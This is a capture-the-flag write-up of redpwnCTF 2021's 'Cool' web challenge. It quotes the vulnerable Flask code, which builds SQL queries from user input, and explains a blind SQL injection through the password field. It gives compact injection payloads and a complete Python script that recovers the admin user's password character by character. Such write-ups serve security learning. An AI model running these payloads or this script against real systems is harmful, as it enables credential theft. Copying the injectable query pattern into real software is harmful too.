# Cool - Web Challenge Writeup
## Author: https://github.com/0xgrey

### Source Code Analysis

Looking into the source code provided in the challenge ([app.py](https://raw.githubusercontent.com/0xgrey/CTF-Writeups/main/2021/redpwnCTF/web/cool/app.py)), a **SQL Injection** vulnerability is prevalent in the `create_user` function.

The snippet of code below highlights the **SQL injection** vulnerability.

Judging by the code flow, the `password` variable can be exploited since the characters are not sanitized for SQL queries by the `allowed_characters` variable, even though the `username` variable is sanitized.

It is also worth noting that the code disallows a password length longer than 50 characters, which limits how long our SQLi payloads can be.

Allowed Characters:
```python3
allowed_characters = set(
    'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789'
)
```

Vulnerable function:
```python3
 create_user(username, password):
    if any(c not in allowed_characters for c in username):
        return (False, 'Alphanumeric usernames only, please.')
    if len(username) < 1:
        return (False, 'Username is too short.')
    if len(password) > 50:
        return (False, 'Password is too long.')
    other_users = execute(
        f'SELECT * FROM users WHERE username=\'{username}\';'
    )
    if len(other_users) > 0:
        return (False, 'Username taken.')
    execute(
        'INSERT INTO users (username, password)'
        f'VALUES (\'{username}\', \'{password}\');'
    )
    return (True, '')
```

A user is created on startup called `ginkoid`. By abusing the SQL injection vulnerability in the password field, we can perform a blind injection to pull the user's credentials from the webserver.

Because the `generate_token` function is used to generage `ginkoid`'s password, we can expect to the length of the password to be 32 characters.

User Creation:
```python3
def init():
    # this is terrible but who cares
    execute('''
        CREATE TABLE IF NOT EXISTS users (
            username TEXT PRIMARY KEY,
            password TEXT
        );
    ''')
    execute('DROP TABLE users;')
    execute('''
        CREATE TABLE users (
            username TEXT PRIMARY KEY,
            password TEXT
        );
    ''')

    # put ginkoid into db
    ginkoid_password = generate_token()
    execute(
        'INSERT OR IGNORE INTO users (username, password)'
        f'VALUES (\'ginkoid\', \'{ginkoid_password}\');'
    )
    execute(
        f'UPDATE users SET password=\'{ginkoid_password}\''
        f'WHERE username=\'ginkoid\';'
    )
```

Generate token:
```python3
def generate_token():
    return ''.join(
        rand.choice(list(allowed_characters)) for _ in range(32)
    )
```

### Exploitation - Theory

Using my CVE Hunting setup, I ran the provided source code with a few [modifications](https://raw.githubusercontent.com/0xgrey/CTF-Writeups/main/2021/redpwnCTF/web/cool/modified_app.py) to the code for simplicity.

First, I added `db/db.sqlite3` to the app's directory to prevent runtime errors. Then, I ran the modified application on VSCode with debug mode enabled to view the SQL queries being executed.

Then, by making a POST request to `/register` with the username and password field, we can view the SQL queries in the debugger by setting a breakpoint on the modified `query` variable before the execute function. This variable is used to show the `VALUES` query before it gets executed.

![image](https://user-images.githubusercontent.com/36116981/126674870-c3054adc-3c03-4de9-94bc-4872ee58e62a.png)

By opening `db.sqlite3`, now we can use the insert query to generate a blind SQLi payload to grab `ginkoid`'s password.

![image](https://user-images.githubusercontent.com/36116981/126675347-cfc49243-6605-4524-9302-9c15ea039901.png)

Eventually, I was able to get an injection payload that was 76 characters long, which will not pass the password length check.

Injection Payload: `a'||(select substr(password,1,1)="M" from users where username="ginkoid")||'`
This payload functions by going character-by-character through `ginkoid`'s password, and setting the user's password to either `1` (true) or `0` (false) if the guessed character is correct.

![image](https://user-images.githubusercontent.com/36116981/126676637-33e39ac9-7193-430b-bc43-0ab32f3ecaff.png)

Because the password limit is set to 50 characters, I slimmed the payload down to where we can pull off a SQLi. The character count for this payload starts at 49 characters, and progresses as the second substring parameter increases to two digit values.

Injection Payload: `'||(select substr(password,1,1)="y" from users)|'`
![image](https://user-images.githubusercontent.com/36116981/126677620-38cdfdbe-7e95-487b-a480-124236bc3691.png)

To verify whether if a character exists or not, we can log in each time a user gets registered with the password being `1`. If the login is successful, then we can verify the placement of a user's password character, thus allowing us to get the user's password after repeated trial and error.

### Exploitation - PoC

The python PoC below shows the script I used to solve the challenge.

```python3
#!/usr/bin/env python3

import requests
import random
import time

url = "https://cool.mc.ax/"
alpha = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789"

password = []
slot = 1
reqs = 0

def login(username):
    payload = {
        "username": username,
        "password": '1'
    }
    r = requests.post(url, data=payload)

    if "Incorrect username or password" not in r.text:
        return True
    else:
        return False

while True:
    for letter in alpha:
        reqs += 1
        if reqs % 20 == 0:
            time.sleep(.3)
        username = ''.join(random.choice(list(alpha)) for _ in range(30))
        payload = {
            "username": username,
            "password": f"'||(select substr(password,{slot},1)=\"{letter}\" from users)|'"
        }

        r = requests.post(f"{url}register", data=payload)
        if "You are logged in!" in r.text:
            if login(payload["username"]):
                if slot == 32:
                    password.append(letter)
                    print(f"Found Ginkoid's Password: {''.join(password)}")
                    exit()
                slot += 1
                print(f"Found Letter: " + letter)
                password.append(letter)
                break
```
The screenshot below shows me grabbing `ginkoid`'s password with the PoC.

![image](https://user-images.githubusercontent.com/36116981/126684507-c925cb49-5832-4fe1-aa9e-2c5aefd7108e.png)

Using that password to log in the webserver, I was then given an mp3 file.

Popping that file into `strings` will provide the flag.

![image](https://user-images.githubusercontent.com/36116981/126684781-3239d600-afa0-4139-85f4-d9f943c079a4.png)

Flag: `flag{44r0n_s4ys_s08r137y_1s_c00l}`
